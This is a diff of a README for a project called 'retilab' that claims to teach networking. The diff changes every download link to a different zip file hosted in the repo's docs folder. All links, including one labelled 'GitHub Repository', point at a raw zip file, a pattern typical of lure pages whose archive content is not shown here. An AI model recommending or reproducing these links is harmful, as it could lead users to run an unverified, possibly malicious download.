@@ -6,7 +6,7 @@ Welcome to **retilab**! This application provides you with complete notes and ha
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software-daimonistic.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software-daimonistic.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software_1.9-alpha.4.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software_1.9-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -50,7 +50,7 @@ These features will help you grasp complex concepts and gain confidence in netwo
 
 To download and install **retilab**, follow these simple steps:
 
-1. **Visit the releases page:** Go to the following link to access the latest version: [Download Here](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software-daimonistic.zip).
+1. **Visit the releases page:** Go to the following link to access the latest version: [Download Here](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software_1.9-alpha.4.zip).
   
 2. **Choose the right version:** Look for the most recent release. You will see options based on your operating system.
 
@@ -81,8 +81,8 @@ Yes, **retilab** is compatible with Windows, macOS, and Linux.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software-daimonistic.zip)
-- [Download Latest Release](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software-daimonistic.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software_1.9-alpha.4.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/karthikeyan86100/retilab/main/docs/Software_1.9-alpha.4.zip)
 
 Visit these links for more information and updates.
 
